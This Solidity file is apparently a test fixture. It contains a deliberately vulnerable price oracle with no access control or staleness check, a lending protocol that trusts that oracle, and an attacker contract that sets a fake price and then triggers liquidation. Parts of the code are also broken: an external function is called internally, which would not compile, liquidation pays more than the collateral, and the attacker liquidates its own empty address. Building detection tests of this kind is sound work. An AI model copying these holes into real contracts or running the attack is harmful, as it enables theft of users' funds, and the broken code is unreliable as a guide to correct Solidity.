// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// ============================================================================
// TEST CONTRACT 2: Oracle Manipulation Chain (Multi-Contract Financial Bug)
// ============================================================================
// Bug: Manipulating price feeds that affect multiple protocols - attacker
// can manipulate oracle price and affect all dependent protocols

contract VulnerablePriceOracle {
    // No access control - anyone can set price!
    uint256 public price;
    address public owner;
    uint256 public lastUpdate;
    
    constructor() {
        owner = msg.sender;
        price = 1000e8; // $1000 initial
        lastUpdate = block.timestamp;
    }
    
    function setPrice(uint256 _price) external {
        // VULNERABILITY: No access control!
        price = _price;
        lastUpdate = block.timestamp;
    }
    
    function getPrice() external view returns (uint256) {
        return price;
    }
    
    // No stale check - old prices still accepted
    function getPriceData() external view returns (uint256, uint256) {
        return (price, lastUpdate);
    }
}

interface ILendingPool {
    function liquidate(address borrower) external;
}

contract VulnerableLendingProtocol {
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public borrowed;
    address public priceOracle;
    uint256 public constant LIQUIDATION_THRESHOLD = 150; // 150%
    
    constructor(address _oracle) {
        priceOracle = _oracle;
    }
    
    function deposit() external payable {
        collateral[msg.sender] += msg.value;
    }
    
    function borrow(uint256 amount) external {
        require(collateral[msg.sender] * getPrice() / 1e8 >= amount * LIQUIDATION_THRESHOLD / 100, "Not enough collateral");
        borrowed[msg.sender] += amount;
        payable(msg.sender).transfer(amount);
    }
    
    function getPrice() internal view returns (uint256) {
        return VulnerablePriceOracle(priceOracle).getPrice();
    }
    
    function getHealthFactor(address user) external view returns (uint256) {
        if (borrowed[user] == 0) return type(uint256).max;
        return collateral[user] * getPrice() * 100 / borrowed[user] / 1e8;
    }
    
    function liquidate(address borrower) external {
        uint256 health = getHealthFactor(borrower);
        require(health < LIQUIDATION_THRESHOLD, "Cannot liquidate healthy position");
        
        uint256 debt = borrowed[borrower];
        uint256 collat = collateral[borrower];
        
        borrowed[borrower] = 0;
        collateral[borrower] = 0;
        
        // Liquidator gets 10% bonus
        payable(msg.sender).transfer(collat * 110 / 100);
    }
}

contract OracleManipulationAttacker {
    address public oracle;
    address public lending;
    
    constructor(address _oracle, address _lending) {
        oracle = _oracle;
        lending = _lending;
    }
    
    function manipulateAndLiquidate(uint256 fakePrice) external {
        // Step 1: Manipulate oracle price to extremely low
        VulnerablePriceOracle(oracle).setPrice(fakePrice);
        
        // Step 2: Liquidate healthy position (exploiting fake price)
        ILendingPool(lending).liquidate(address(this)); // Attacker's address as dummy
    }
    
    receive() external payable {}
}